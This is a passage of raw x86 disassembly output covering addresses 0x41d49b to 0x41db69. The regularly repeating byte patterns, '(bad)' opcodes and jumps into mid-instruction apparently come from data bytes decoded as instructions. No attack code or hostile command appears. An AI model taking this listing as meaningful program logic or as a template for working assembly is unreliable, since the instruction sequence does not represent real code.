  41d49b:	clc    
  41d49c:	add    al,0xf8
  41d49e:	cld    
  41d49f:	clc    
  41d4a0:	add    ah,bh
  41d4a2:	add    BYTE PTR [eax],al
  41d4a4:	cld    
  41d4a5:	add    BYTE PTR [esp+eax*1],al
  41d4a8:	clc    
  41d4a9:	add    al,0x8
  41d4ab:	or     esi,esp
  41d4ad:	or     BYTE PTR [edi+ecx*1],cl
  41d4b0:	lock or al,0x10
  41d4b3:	adc    ah,ch
  41d4b5:	adc    BYTE PTR [esi+0x56],dl
  41d4b8:	push   esi
  41d4b9:	adc    al,0x55
  41d4bb:	push   edi
  41d4bc:	push   ecx
  41d4bd:	sbb    BYTE PTR [ebp+0x47],al
  41d4c0:	dec    ecx
  41d4c1:	sbb    al,0x44
  41d4c3:	inc    esp
  41d4c4:	inc    eax
  41d4c5:	and    BYTE PTR [ebx+0x55],cl
  41d4c8:	dec    ebx
  41d4c9:	and    al,0x52
  41d4cb:	push   edx
  41d4cc:	push   edx
  41d4cd:	sub    BYTE PTR [edx-0x53d35556],ch
  41d4d3:	lods   al,BYTE PTR ds:[esi]
  41d4d4:	test   al,0x30
  41d4d6:	xchg   DWORD PTR [ecx-0x7979cb79],eax
  41d4dc:	xchg   BYTE PTR [eax],bh
  41d4de:	cmc    
  41d4df:	idiv   ecx
  41d4e1:	cmp    al,0x94
  41d4e3:	xchg   esp,eax
  41d4e4:	nop
  41d4e5:	inc    eax
  41d4e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4e8:	cwde   
  41d4e9:	inc    esp
  41d4ea:	mov    ds:0xbd48a3a5,eax
  41d4ef:	mov    ebp,0xa6a64ca0
  41d4f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4f5:	push   eax
  41d4f6:	lods   al,BYTE PTR ds:[esi]
  41d4f7:	lods   al,BYTE PTR ds:[esi]
  41d4f8:	mov    al,ds:0xa4585854
  41d4fd:	pop    eax
  41d4fe:	pop    esp
  41d4ff:	pop    esp
  41d500:	mov    al,ds:0x9c60605c
  41d505:	pusha  
  41d506:	fs fs cwde 
  41d509:	fs push 0x6c689468
  41d50f:	ins    BYTE PTR es:[edi],dx
  41d510:	nop
  41d511:	ins    BYTE PTR es:[edi],dx
  41d512:	jo     0x41d584
  41d514:	mov    WORD PTR [eax+0x74],?
  41d517:	je     0x41d4a1
  41d519:	je     0x41d593
  41d51b:	js     0x41d4a1
  41d51d:	js     0x41d59b
  41d51f:	jl     0x41d4a1
  41d521:	jl     0x41d4a3
  41d523:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41d528:	js     0x41d4ae
  41d52a:	mov    BYTE PTR [eax-0x7373778c],cl
  41d530:	jo     0x41d4be
  41d532:	nop
  41d533:	nop
  41d534:	ins    BYTE PTR es:[edi],dx
  41d535:	nop
  41d536:	xchg   esp,eax
  41d537:	xchg   esp,eax
  41d538:	push   0x64989894
  41d53d:	cwde   
  41d53e:	pushf  
  41d53f:	pushf  
  41d540:	pusha  
  41d541:	pushf  
  41d542:	mov    al,ds:0xa4a05ca0
  41d547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d548:	pop    eax
  41d549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d54a:	test   al,0xa8
  41d54c:	push   esp
  41d54d:	test   al,0xac
  41d54f:	lods   al,BYTE PTR ds:[esi]
  41d550:	push   eax
  41d551:	lods   al,BYTE PTR ds:[esi]
  41d552:	mov    al,0xb0
  41d554:	dec    esp
  41d555:	mov    al,0xb4
  41d557:	mov    ah,0x48
  41d559:	mov    ah,0xb8
  41d55b:	mov    eax,0xbcbcb844
  41d560:	inc    eax
  41d561:	mov    esp,0xc03cc0c0
  41d566:	(bad)  
  41d567:	les    edi,FWORD PTR [eax]
  41d569:	(bad)  
  41d56a:	enter  0x34c8,0xc8
  41d56e:	int3   
  41d56f:	int3   
  41d570:	xor    ah,cl
  41d572:	rcl    al,1
  41d574:	sub    al,0xd0
  41d576:	aam    0xd4
  41d578:	sub    ah,dl
  41d57a:	fcomp  st(0)
  41d57c:	and    al,0xd8
  41d57e:	(bad)  
  41d580:	and    ah,bl
  41d582:	loopne 0x41d564
  41d584:	sbb    al,0xe0
  41d586:	in     al,0xe4
  41d588:	sbb    ah,ah
  41d58a:	call   0xed29ea77
  41d58f:	in     al,dx
  41d590:	adc    ah,ch
  41d592:	lock lock or al,0xf0
  41d596:	hlt    
  41d597:	hlt    
  41d598:	or     ah,dh
  41d59a:	clc    
  41d59b:	clc    
  41d59c:	add    al,0xf8
  41d59e:	cld    
  41d59f:	cld    
  41d5a0:	add    ah,bh
  41d5a2:	add    BYTE PTR [eax],al
  41d5a4:	cld    
  41d5a5:	add    BYTE PTR [esp+eax*1],al
  41d5a8:	clc    
  41d5a9:	add    al,0x8
  41d5ab:	or     ah,dh
  41d5ad:	or     BYTE PTR [esp+ecx*1],cl
  41d5b0:	lock or al,0x10
  41d5b3:	adc    ah,ch
  41d5b5:	adc    BYTE PTR [esp+edx*1],dl
  41d5b8:	call   0xe459edd1
  41d5bd:	sbb    BYTE PTR [esp+ebx*1],bl
  41d5c0:	loopne 0x41d5de
  41d5c2:	and    BYTE PTR [eax],ah
  41d5c4:	fsub   QWORD PTR [eax]
  41d5c6:	and    al,0x24
  41d5c8:	fsub   DWORD PTR [eax+ebp*1]
  41d5cb:	sub    ah,dl
  41d5cd:	sub    BYTE PTR [esp+ebp*1],ch
  41d5d0:	shr    BYTE PTR [eax+esi*1],1
  41d5d3:	xor    ah,cl
  41d5d5:	xor    BYTE PTR [esp+esi*1],dh
  41d5d8:	enter  0x3834,0x38
  41d5dc:	les    edi,FWORD PTR [eax]
  41d5de:	cmp    al,0x3c
  41d5e0:	sar    BYTE PTR [eax+eax*2],0x40
  41d5e4:	mov    esp,0xb8444440
  41d5e9:	inc    esp
  41d5ea:	dec    eax
  41d5eb:	dec    eax
  41d5ec:	mov    ah,0x48
  41d5ee:	dec    esp
  41d5ef:	dec    esp
  41d5f0:	mov    al,0x4c
  41d5f2:	push   eax
  41d5f3:	push   eax
  41d5f4:	lods   al,BYTE PTR ds:[esi]
  41d5f5:	push   eax
  41d5f6:	push   esp
  41d5f7:	push   esp
  41d5f8:	test   al,0x54
  41d5fa:	pop    eax
  41d5fb:	pop    eax
  41d5fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5fd:	pop    eax
  41d5fe:	pop    esp
  41d5ff:	pop    esp
  41d600:	mov    al,ds:0x9c60605c
  41d605:	pusha  
  41d606:	fs fs cwde 
  41d609:	fs push 0x6c689468
  41d60f:	ins    BYTE PTR es:[edi],dx
  41d610:	nop
  41d611:	ins    BYTE PTR es:[edi],dx
  41d612:	jo     0x41d684
  41d614:	mov    WORD PTR [eax+0x74],?
  41d617:	je     0x41d5a1
  41d619:	je     0x41d693
  41d61b:	js     0x41d5a1
  41d61d:	js     0x41d69b
  41d61f:	jl     0x41d5a1
  41d621:	jl     0x41d5a3
  41d623:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41d628:	js     0x41d5ae
  41d62a:	mov    BYTE PTR [eax-0x7373778c],cl
  41d630:	jo     0x41d5be
  41d632:	nop
  41d633:	nop
  41d634:	ins    BYTE PTR es:[edi],dx
  41d635:	nop
  41d636:	xchg   esp,eax
  41d637:	xchg   esp,eax
  41d638:	push   0x64989894
  41d63d:	cwde   
  41d63e:	pushf  
  41d63f:	pushf  
  41d640:	pusha  
  41d641:	pushf  
  41d642:	mov    al,ds:0xa4a05ca0
  41d647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d648:	pop    eax
  41d649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d64a:	test   al,0xa8
  41d64c:	push   esp
  41d64d:	test   al,0xac
  41d64f:	lods   al,BYTE PTR ds:[esi]
  41d650:	push   eax
  41d651:	lods   al,BYTE PTR ds:[esi]
  41d652:	mov    al,0xb0
  41d654:	dec    esp
  41d655:	mov    al,0xb4
  41d657:	mov    ah,0x48
  41d659:	mov    ah,0xb8
  41d65b:	mov    eax,0xbcbcb844
  41d660:	inc    eax
  41d661:	mov    esp,0xc03cc0c0
  41d666:	(bad)  
  41d667:	les    edi,FWORD PTR [eax]
  41d669:	(bad)  
  41d66a:	enter  0x34c8,0xc8
  41d66e:	int3   
  41d66f:	int3   
  41d670:	xor    ah,cl
  41d672:	rcl    al,1
  41d674:	sub    al,0xd0
  41d676:	aam    0xd4
  41d678:	sub    ah,dl
  41d67a:	fcomp  st(0)
  41d67c:	and    al,0xd8
  41d67e:	(bad)  
  41d680:	and    ah,bl
  41d682:	loopne 0x41d664
  41d684:	sbb    al,0xe0
  41d686:	in     al,0xe4
  41d688:	sbb    ah,ah
  41d68a:	call   0xed29eb77
  41d68f:	in     al,dx
  41d690:	adc    ah,ch
  41d692:	lock lock or al,0xf0
  41d696:	hlt    
  41d697:	hlt    
  41d698:	or     ah,dh
  41d69a:	clc    
  41d69b:	clc    
  41d69c:	add    al,0xf8
  41d69e:	cld    
  41d69f:	cld    
  41d6a0:	add    ah,bh
  41d6a2:	add    BYTE PTR [eax],al
  41d6a4:	cld    
  41d6a5:	add    BYTE PTR [esp+eax*1],al
  41d6a8:	clc    
  41d6a9:	add    al,0x8
  41d6ab:	or     ah,dh
  41d6ad:	or     BYTE PTR [esp+ecx*1],cl
  41d6b0:	lock or al,0x10
  41d6b3:	adc    ah,ch
  41d6b5:	adc    BYTE PTR [esp+edx*1],dl
  41d6b8:	call   0xe459eed1
  41d6bd:	sbb    BYTE PTR [esp+ebx*1],bl
  41d6c0:	loopne 0x41d6de
  41d6c2:	and    BYTE PTR [eax],ah
  41d6c4:	fsub   QWORD PTR [eax]
  41d6c6:	and    al,0x24
  41d6c8:	fsub   DWORD PTR [eax+ebp*1]
  41d6cb:	sub    ah,dl
  41d6cd:	sub    BYTE PTR [esp+ebp*1],ch
  41d6d0:	shr    BYTE PTR [eax+esi*1],1
  41d6d3:	xor    ah,cl
  41d6d5:	xor    BYTE PTR [esp+esi*1],dh
  41d6d8:	enter  0x3834,0x38
  41d6dc:	les    edi,FWORD PTR [eax]
  41d6de:	cmp    al,0x3c
  41d6e0:	sar    BYTE PTR [eax+eax*2],0x40
  41d6e4:	mov    esp,0xb8444440
  41d6e9:	inc    esp
  41d6ea:	dec    eax
  41d6eb:	dec    eax
  41d6ec:	mov    ah,0x48
  41d6ee:	dec    esp
  41d6ef:	dec    esp
  41d6f0:	mov    al,0x4c
  41d6f2:	push   eax
  41d6f3:	push   eax
  41d6f4:	lods   al,BYTE PTR ds:[esi]
  41d6f5:	push   eax
  41d6f6:	push   esp
  41d6f7:	push   esp
  41d6f8:	test   al,0x54
  41d6fa:	pop    eax
  41d6fb:	pop    eax
  41d6fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6fd:	pop    eax
  41d6fe:	pop    esp
  41d6ff:	pop    esp
  41d700:	mov    al,ds:0x9c60605c
  41d705:	pusha  
  41d706:	fs fs cwde 
  41d709:	fs push 0x6c689468
  41d70f:	ins    BYTE PTR es:[edi],dx
  41d710:	nop
  41d711:	ins    BYTE PTR es:[edi],dx
  41d712:	jo     0x41d784
  41d714:	mov    WORD PTR [eax+0x74],?
  41d717:	je     0x41d6a1
  41d719:	je     0x41d793
  41d71b:	js     0x41d6a1
  41d71d:	js     0x41d79b
  41d71f:	jl     0x41d6a1
  41d721:	jl     0x41d6a3
  41d723:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41d728:	js     0x41d6ae
  41d72a:	mov    BYTE PTR [eax-0x7373778c],cl
  41d730:	jo     0x41d6be
  41d732:	nop
  41d733:	nop
  41d734:	ins    BYTE PTR es:[edi],dx
  41d735:	nop
  41d736:	xchg   esp,eax
  41d737:	xchg   esp,eax
  41d738:	push   0x64989894
  41d73d:	cwde   
  41d73e:	pushf  
  41d73f:	pushf  
  41d740:	pusha  
  41d741:	pushf  
  41d742:	mov    al,ds:0xa4a05ca0
  41d747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d748:	pop    eax
  41d749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d74a:	test   al,0xa8
  41d74c:	push   esp
  41d74d:	test   al,0xac
  41d74f:	lods   al,BYTE PTR ds:[esi]
  41d750:	push   eax
  41d751:	lods   al,BYTE PTR ds:[esi]
  41d752:	mov    al,0xb0
  41d754:	dec    esp
  41d755:	mov    al,0xb4
  41d757:	mov    ah,0x48
  41d759:	mov    ah,0xb8
  41d75b:	mov    eax,0xbcbcb844
  41d760:	inc    eax
  41d761:	mov    esp,0xc03cc0c0
  41d766:	(bad)  
  41d767:	les    edi,FWORD PTR [eax]
  41d769:	(bad)  
  41d76a:	enter  0x34c8,0xc8
  41d76e:	int3   
  41d76f:	int3   
  41d770:	xor    ah,cl
  41d772:	rcl    al,1
  41d774:	sub    al,0xd0
  41d776:	aam    0xd4
  41d778:	sub    ah,dl
  41d77a:	fcomp  st(0)
  41d77c:	and    al,0xd8
  41d77e:	(bad)  
  41d780:	and    ah,bl
  41d782:	loopne 0x41d764
  41d784:	sbb    al,0xe0
  41d786:	in     al,0xe4
  41d788:	sbb    ah,ah
  41d78a:	call   0xed29ec77
  41d78f:	in     al,dx
  41d790:	adc    ah,ch
  41d792:	lock lock or al,0xf0
  41d796:	hlt    
  41d797:	hlt    
  41d798:	or     ah,dh
  41d79a:	clc    
  41d79b:	clc    
  41d79c:	add    al,0xf8
  41d79e:	cld    
  41d79f:	cld    
  41d7a0:	add    ah,bh
  41d7a2:	add    BYTE PTR [eax],al
  41d7a4:	cld    
  41d7a5:	add    BYTE PTR [esp+eax*1],al
  41d7a8:	clc    
  41d7a9:	add    al,0x8
  41d7ab:	or     ah,dh
  41d7ad:	or     BYTE PTR [esp+ecx*1],cl
  41d7b0:	lock or al,0x10
  41d7b3:	adc    ah,ch
  41d7b5:	adc    BYTE PTR [esp+edx*1],dl
  41d7b8:	call   0xe459efd1
  41d7bd:	sbb    BYTE PTR [esp+ebx*1],bl
  41d7c0:	loopne 0x41d7de
  41d7c2:	and    BYTE PTR [eax],ah
  41d7c4:	fsub   QWORD PTR [eax]
  41d7c6:	and    al,0x24
  41d7c8:	fsub   DWORD PTR [eax+ebp*1]
  41d7cb:	sub    ah,dl
  41d7cd:	sub    BYTE PTR [esp+ebp*1],ch
  41d7d0:	shr    BYTE PTR [eax+esi*1],1
  41d7d3:	xor    ah,cl
  41d7d5:	xor    BYTE PTR [esp+esi*1],dh
  41d7d8:	enter  0x3834,0x38
  41d7dc:	les    edi,FWORD PTR [eax]
  41d7de:	cmp    al,0x3c
  41d7e0:	sar    BYTE PTR [eax+eax*2],0x40
  41d7e4:	mov    esp,0xb8444440
  41d7e9:	inc    esp
  41d7ea:	dec    eax
  41d7eb:	dec    eax
  41d7ec:	mov    ah,0x48
  41d7ee:	dec    esp
  41d7ef:	dec    esp
  41d7f0:	mov    al,0x4c
  41d7f2:	push   eax
  41d7f3:	push   eax
  41d7f4:	lods   al,BYTE PTR ds:[esi]
  41d7f5:	push   eax
  41d7f6:	push   esp
  41d7f7:	push   esp
  41d7f8:	test   al,0x54
  41d7fa:	pop    eax
  41d7fb:	pop    eax
  41d7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7fd:	pop    eax
  41d7fe:	pop    esp
  41d7ff:	pop    esp
  41d800:	mov    al,ds:0x9c60605c
  41d805:	pusha  
  41d806:	fs fs cwde 
  41d809:	fs push 0x6c689468
  41d80f:	ins    BYTE PTR es:[edi],dx
  41d810:	nop
  41d811:	ins    BYTE PTR es:[edi],dx
  41d812:	jo     0x41d884
  41d814:	mov    WORD PTR [eax+0x74],?
  41d817:	je     0x41d7a1
  41d819:	je     0x41d893
  41d81b:	js     0x41d7a1
  41d81d:	js     0x41d89b
  41d81f:	jl     0x41d7a1
  41d821:	jl     0x41d7a3
  41d823:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41d828:	js     0x41d7ae
  41d82a:	mov    BYTE PTR [eax-0x7373778c],cl
  41d830:	jo     0x41d7be
  41d832:	nop
  41d833:	nop
  41d834:	ins    BYTE PTR es:[edi],dx
  41d835:	nop
  41d836:	xchg   esp,eax
  41d837:	xchg   esp,eax
  41d838:	push   0x64989894
  41d83d:	cwde   
  41d83e:	pushf  
  41d83f:	pushf  
  41d840:	pusha  
  41d841:	pushf  
  41d842:	mov    al,ds:0xa4a05ca0
  41d847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d848:	pop    eax
  41d849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d84a:	test   al,0xa8
  41d84c:	push   esp
  41d84d:	test   al,0xac
  41d84f:	lods   al,BYTE PTR ds:[esi]
  41d850:	push   eax
  41d851:	lods   al,BYTE PTR ds:[esi]
  41d852:	mov    al,0xb0
  41d854:	dec    esp
  41d855:	mov    al,0xb4
  41d857:	mov    ah,0x48
  41d859:	mov    ah,0xb8
  41d85b:	mov    eax,0xbcbcb844
  41d860:	inc    eax
  41d861:	mov    esp,0xc03cc0c0
  41d866:	(bad)  
  41d867:	les    edi,FWORD PTR [eax]
  41d869:	(bad)  
  41d86a:	enter  0x34c8,0xc8
  41d86e:	int3   
  41d86f:	int3   
  41d870:	xor    ah,cl
  41d872:	rcl    al,1
  41d874:	sub    al,0xd0
  41d876:	aam    0xd4
  41d878:	sub    ah,dl
  41d87a:	fcomp  st(0)
  41d87c:	and    al,0xd8
  41d87e:	(bad)  
  41d880:	and    ah,bl
  41d882:	loopne 0x41d864
  41d884:	sbb    al,0xe0
  41d886:	in     al,0xe4
  41d888:	sbb    ah,ah
  41d88a:	call   0xed29ed77
  41d88f:	in     al,dx
  41d890:	adc    ah,ch
  41d892:	lock lock or al,0xf0
  41d896:	hlt    
  41d897:	hlt    
  41d898:	or     ah,dh
  41d89a:	clc    
  41d89b:	clc    
  41d89c:	add    al,0xf8
  41d89e:	cld    
  41d89f:	cld    
  41d8a0:	add    ah,bh
  41d8a2:	add    BYTE PTR [eax],al
  41d8a4:	cld    
  41d8a5:	add    BYTE PTR [esp+eax*1],al
  41d8a8:	clc    
  41d8a9:	add    al,0x8
  41d8ab:	or     ah,dh
  41d8ad:	or     bl,dh
  41d8af:	or     eax,0x10100cf3
  41d8b4:	in     al,dx
  41d8b5:	add    BYTE PTR [esp+eax*1],al
  41d8b8:	sbb    BYTE PTR [eax+ecx*1],al
  41d8bb:	or     BYTE PTR [eax+ecx*1],dl
  41d8be:	or     al,0xc
  41d8c0:	adc    BYTE PTR [eax+esi*1],cl
  41d8c3:	xor    BYTE PTR [eax+esi*1],ch
  41d8c6:	xor    al,0x34
  41d8c8:	sub    BYTE PTR [eax+edi*1],dh
  41d8cb:	cmp    BYTE PTR [eax+edi*1],ah
  41d8ce:	cmp    al,0x2c
  41d8d0:	shr    BYTE PTR [eax+esi*1],1
  41d8d3:	xor    ah,cl
  41d8d5:	and    BYTE PTR [esp],ah
  41d8d8:	cmp    BYTE PTR [eax+ebp*1],ah
  41d8db:	sub    BYTE PTR [eax+ebp*1],dh
  41d8de:	sub    al,0x2c
  41d8e0:	xor    BYTE PTR [eax+edx*2],ch
  41d8e3:	push   eax
  41d8e4:	dec    esp
  41d8e5:	push   eax
  41d8e6:	push   esp
  41d8e7:	push   esp
  41d8e8:	dec    eax
  41d8e9:	push   esp
  41d8ea:	pop    eax
  41d8eb:	pop    eax
  41d8ec:	inc    esp
  41d8ed:	pop    eax
  41d8ee:	pop    esp
  41d8ef:	dec    esp
  41d8f0:	mov    al,0x4c
  41d8f2:	push   eax
  41d8f3:	push   eax
  41d8f4:	lods   al,BYTE PTR ds:[esi]
  41d8f5:	inc    eax
  41d8f6:	inc    esp
  41d8f7:	push   edi
  41d8f8:	test   eax,0xa55b5953
  41d8fd:	pop    edi
  41d8fe:	pop    ebp
  41d8ff:	pop    edi
  41d900:	mov    eax,ds:0x9d63615b
  41d905:	addr16 gs addr16 cdq 
  41d909:	arpl   WORD PTR [ecx+0x6b],bp
  41d90c:	xchg   ebp,eax
  41d90d:	js     0x41d98b
  41d90f:	ins    BYTE PTR es:[edi],dx
  41d910:	nop
  41d911:	ins    BYTE PTR es:[edi],dx
  41d912:	jo     0x41d984
  41d914:	mov    WORD PTR [eax+0x64],fs
  41d917:	ja     0x41d8a2
  41d919:	jae    0x41d994
  41d91b:	jnp    0x41d8a2
  41d91d:	jg     0x41d99c
  41d91f:	jg     0x41d8a2
  41d921:	jnp    0x41d8a4
  41d923:	cmp    DWORD PTR [ebp-0x79],0xffffff85
  41d927:	xchg   DWORD PTR [ecx-0x7d],edi
  41d92a:	mov    DWORD PTR [ebx-0x7363678b],ecx
  41d930:	jo     0x41d8be
  41d932:	nop
  41d933:	nop
  41d934:	ins    BYTE PTR es:[edi],dx
  41d935:	add    BYTE PTR [edi+edx*4-0x64666c97],0x65
  41d93d:	lahf   
  41d93e:	popf   
  41d93f:	lahf   
  41d940:	popa   
  41d941:	fwait
  41d942:	mov    eax,ds:0xa5a75da3
  41d947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d948:	pop    ecx
  41d949:	mov    ds:0xb855aba9,eax
  41d94e:	mov    esp,0xb0ac50ac
  41d953:	mov    al,0x4c
  41d955:	mov    al,ds:0xb349b7a4
  41d95a:	mov    bh,0xa9
  41d95c:	mov    bh,0xa9
  41d95e:	mov    bl,0xad
  41d960:	inc    ecx
  41d961:	mov    ebx,0xd1cfc3c1
  41d966:	retf   
  41d967:	aad    0xcb
  41d969:	aad    0xc9
  41d96b:	retf   
  41d96c:	xor    eax,0x30ccdcd8
  41d971:	int3   
  41d972:	rcl    al,1
  41d974:	sub    al,0xc0
  41d976:	(bad)  
  41d977:	xlat   BYTE PTR ds:[ebx]
  41d978:	sub    ebx,edx
  41d97a:	xlat   BYTE PTR ds:[ebx]
  41d97b:	leave  
  41d97c:	xlat   BYTE PTR ds:[ebx]
  41d97d:	leave  
  41d97e:	ror    ebp,cl
  41d980:	and    ebx,ebx
  41d982:	loope  0x41d967
  41d984:	out    dx,eax
  41d985:	icebp  
  41d986:	jmp    0x41d97d
  41d988:	jmp    0x41d97f
  41d98a:	jmp    0xfd39ef7a
  41d98f:	in     al,dx
  41d990:	adc    ah,ch
  41d992:	lock lock or al,0xe0
  41d996:	in     al,0xf7
  41d998:	or     ebx,esi
  41d99a:	imul   ecx
  41d99c:	imul   ecx
  41d99e:	repz in eax,dx
  41d9a0:	add    ebx,edi
  41d9a2:	add    DWORD PTR [ebx],eax
  41d9a4:	movups XMMWORD PTR [ebx],xmm1
  41d9a7:	adc    eax,0xb09150b
  41d9ac:	cmc    
  41d9ad:	sbb    BYTE PTR [esp+ecx*1],bl
  41d9b0:	lock or al,0x10
  41d9b3:	adc    ah,ch
  41d9b5:	add    BYTE PTR [edi+edx*1],al
  41d9b8:	jmp    0x174af0d0
  41d9bd:	or     DWORD PTR [ebx],edx
  41d9bf:	or     eax,0x23211be1
  41d9c4:	das    
  41d9c5:	xor    DWORD PTR [ebx],ebp
  41d9c7:	xor    eax,0x2b29352b
  41d9cc:	aad    0x38
  41d9ce:	cmp    al,0x2c
  41d9d0:	shr    BYTE PTR [eax+esi*1],1
  41d9d3:	xor    ah,cl
  41d9d5:	and    BYTE PTR [edi+esi*1],ah
  41d9d8:	leave  
  41d9d9:	xor    esi,DWORD PTR [edi]
  41d9db:	sub    DWORD PTR [edi],esi
  41d9dd:	sub    DWORD PTR [ebx],esi
  41d9df:	sub    eax,0x43413bc1
  41d9e4:	dec    edi
  41d9e5:	push   ecx
  41d9e6:	dec    ebx
  41d9e7:	push   ebp
  41d9e8:	dec    ebx
  41d9e9:	push   ebp
  41d9ea:	dec    ecx
  41d9eb:	dec    ebx
  41d9ec:	mov    ch,0x58
  41d9ee:	pop    esp
  41d9ef:	dec    esp
  41d9f0:	mov    al,0x4c
  41d9f2:	push   eax
  41d9f3:	push   eax
  41d9f4:	lods   al,BYTE PTR ds:[esi]
  41d9f5:	inc    eax
  41d9f6:	inc    esp
  41d9f7:	push   edi
  41d9f8:	test   eax,0x57495753
  41d9fd:	dec    ecx
  41d9fe:	push   ebx
  41d9ff:	dec    ebp
  41da00:	mov    eax,ds:0x6f63615b
  41da05:	jno    0x41da72
  41da07:	jne    0x41da74
  41da09:	jne    0x41da74
  41da0b:	imul   edx,DWORD PTR [ebp-0x6f938388],0x6c
  41da12:	jo     0x41da84
  41da14:	mov    WORD PTR [eax+0x64],fs
  41da17:	ja     0x41d9a2
  41da19:	jae    0x41da94
  41da1b:	jnp    0x41d9a2
  41da1d:	jg     0x41da9c
  41da1f:	jg     0x41d9a2
  41da21:	jnp    0x41d9a4
  41da23:	cmp    DWORD PTR [ebp-0x79],0xffffff85
  41da27:	xchg   DWORD PTR [ecx-0x7d],edi
  41da2a:	mov    DWORD PTR [ebx-0x7363678b],ecx
  41da30:	jo     0x41d9be
  41da32:	nop
  41da33:	nop
  41da34:	ins    BYTE PTR es:[edi],dx
  41da35:	add    BYTE PTR [edi+edx*4-0x64666c97],0x65
  41da3d:	lahf   
  41da3e:	popf   
  41da3f:	lahf   
  41da40:	popa   
  41da41:	fwait
  41da42:	mov    eax,ds:0xa5a75da3
  41da47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da48:	pop    ecx
  41da49:	mov    ds:0xb855aba9,eax
  41da4e:	mov    esp,0xb0ac50ac
  41da53:	mov    al,0x4c
  41da55:	mov    al,ds:0xb349b7a4
  41da5a:	mov    ecx,0xbdbf45bb
  41da5f:	mov    edi,0xc3c1bb41
  41da64:	cmp    eax,0x39c7c5c7
  41da69:	ret    
  41da6a:	leave  
  41da6b:	retf   
  41da6c:	xor    eax,0x30ccdcd8
  41da71:	int3   
  41da72:	rcl    al,1
  41da74:	sub    al,0xc0
  41da76:	(bad)  
  41da77:	xlat   BYTE PTR ds:[ebx]
  41da78:	sub    ebx,edx
  41da7a:	xlat   BYTE PTR ds:[ebx]
  41da7b:	leave  
  41da7c:	xlat   BYTE PTR ds:[ebx]
  41da7d:	leave  
  41da7e:	ror    ebp,cl
  41da80:	and    ebx,ebx
  41da82:	loope  0x41da67
  41da84:	out    dx,eax
  41da85:	icebp  
  41da86:	jmp    0x41da7d
  41da88:	jmp    0x41da7f
  41da8a:	jmp    0xfd39f07a
  41da8f:	in     al,dx
  41da90:	adc    ah,ch
  41da92:	lock lock or al,0xe0
  41da96:	in     al,0xf7
  41da98:	or     ebx,esi
  41da9a:	imul   ecx
  41da9c:	imul   ecx
  41da9e:	repz in eax,dx
  41daa0:	add    ebx,edi
  41daa2:	add    DWORD PTR [ebx],eax
  41daa4:	movups XMMWORD PTR [ebx],xmm1
  41daa7:	adc    eax,0xb09150b
  41daac:	cmc    
  41daad:	sbb    BYTE PTR [esp+ecx*1],bl
  41dab0:	lock or al,0x10
  41dab3:	adc    ah,ch
  41dab5:	add    BYTE PTR [edi+edx*1],al
  41dab8:	jmp    0x174af1d0
  41dabd:	or     DWORD PTR [ebx],edx
  41dabf:	or     eax,0x23211be1
  41dac4:	das    
  41dac5:	xor    DWORD PTR [ebx],ebp
  41dac7:	xor    eax,0x2b29352b
  41dacc:	aad    0x38
  41dace:	cmp    al,0x2c
  41dad0:	shr    BYTE PTR [eax+esi*1],1
  41dad3:	xor    ah,cl
  41dad5:	and    BYTE PTR [edi+esi*1],ah
  41dad8:	leave  
  41dad9:	xor    esi,DWORD PTR [edi]
  41dadb:	sub    DWORD PTR [edi],esi
  41dadd:	sub    DWORD PTR [ebx],esi
  41dadf:	sub    eax,0x43413bc1
  41dae4:	dec    edi
  41dae5:	push   ecx
  41dae6:	dec    ebx
  41dae7:	push   ebp
  41dae8:	dec    ebx
  41dae9:	push   ebp
  41daea:	dec    ecx
  41daeb:	dec    ebx
  41daec:	mov    ch,0x58
  41daee:	pop    esp
  41daef:	dec    esp
  41daf0:	mov    al,0x4c
  41daf2:	push   eax
  41daf3:	push   eax
  41daf4:	lods   al,BYTE PTR ds:[esi]
  41daf5:	inc    eax
  41daf6:	inc    esp
  41daf7:	push   edi
  41daf8:	test   eax,0x57495753
  41dafd:	dec    ecx
  41dafe:	push   ebx
  41daff:	dec    ebp
  41db00:	mov    eax,ds:0x6f63615b
  41db05:	jno    0x41db72
  41db07:	jne    0x41db74
  41db09:	jne    0x41db74
  41db0b:	imul   edx,DWORD PTR [ebp-0x6f938388],0x6c
  41db12:	jo     0x41db84
  41db14:	mov    WORD PTR [eax+0x64],fs
  41db17:	ja     0x41daa2
  41db19:	jae    0x41db92
  41db1b:	imul   esi,DWORD PTR [edi+0x69],0x7b816d73
  41db22:	add    DWORD PTR [ebx-0x6a746e71],0x8b89958b
  41db2c:	jne    0x41dac6
  41db2e:	pushf  
  41db2f:	mov    WORD PTR [eax-0x74],?
  41db32:	nop
  41db33:	nop
  41db34:	ins    BYTE PTR es:[edi],dx
  41db35:	add    BYTE PTR [edi+edx*4-0x64666c97],0x65
  41db3d:	lahf   
  41db3e:	popf   
  41db3f:	lahf   
  41db40:	popa   
  41db41:	fwait
  41db42:	mov    eax,ds:0xa5a75da3
  41db47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db48:	pop    ecx
  41db49:	mov    ds:0xb855aba9,eax
  41db4e:	mov    esp,0xb0ac50ac
  41db53:	mov    al,0x4c
  41db55:	mov    al,ds:0xb349b7a4
  41db5a:	mov    ecx,0xbdbf45bb
  41db5f:	mov    edi,0xc3c1bb41
  41db64:	cmp    eax,0x39c7c5c7
  41db69:	ret    
